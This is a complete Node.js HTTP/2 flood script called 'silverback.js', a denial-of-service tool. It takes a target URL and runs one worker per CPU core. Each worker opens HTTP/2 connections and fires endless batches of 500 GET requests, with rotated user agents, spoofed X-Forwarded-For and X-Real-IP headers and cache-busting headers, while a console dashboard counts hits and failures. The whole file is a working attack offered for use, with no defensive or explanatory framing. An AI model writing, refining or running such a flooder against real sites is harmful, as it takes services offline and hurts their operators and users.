const fs = require('fs');
const http2 = require('http2');
const cluster = require('cluster');
const os = require('os');

const target = process.argv[2];
if (!target) {
  console.error("Usage: node silverback.js <target_url>");
  process.exit(1);
}

const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
const parsed = new URL(target);

let total = 0;
let hit = 0;
let fail = 0;

// Spoofed IP generator
function spoofIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
}

// Generate headers per request
function genHeaders() {
  return {
    ':method': 'GET',
    ':path': parsed.pathname + parsed.search,
    ':authority': parsed.hostname,
    'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
    'x-forwarded-for': spoofIP(),
    'x-real-ip': spoofIP(),
    'accept-language': 'en-US,en;q=0.9',
    'accept': '*/*',
    'upgrade-insecure-requests': '1',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'dnt': '1',
    'te': 'trailers'
  };
}

// Main request loop
function flood() {
  const client = http2.connect(parsed.origin, {
    rejectUnauthorized: false
  });

  client.on('error', () => {
    fail++;
    client.destroy();
  });

  client.on('connect', () => {
    function sendIt() {
      for (let i = 0; i < 500; i++) {
        const req = client.request(genHeaders());

        req.on('response', () => {
          hit++;
          total++;
          req.close();
        });

        req.on('error', () => {
          fail++;
          total++;
        });

        req.end();
      }
      setImmediate(sendIt); // Keep firing
    }

    sendIt();
  });
}

// Logging (in master only)
if (cluster.isMaster) {
  console.clear();
  console.log("SILVERBACK");
  console.log("===========");

  setInterval(() => {
    console.clear();
    console.log("SILVERBACK");
    console.log("===========");
    console.log(`TOTAL - ${total}`);
    console.log(`HIT   - ${hit}`);
    console.log(`KXX   - ${fail}`);
  }, 1000);

  // Fork all cores
  const cores = os.cpus().length;
  console.log(`Starting SILVERBACK flood with ${cores} threads...`);
  for (let i = 0; i < cores; i++) {
    cluster.fork();
  }
} else {
  flood();
}
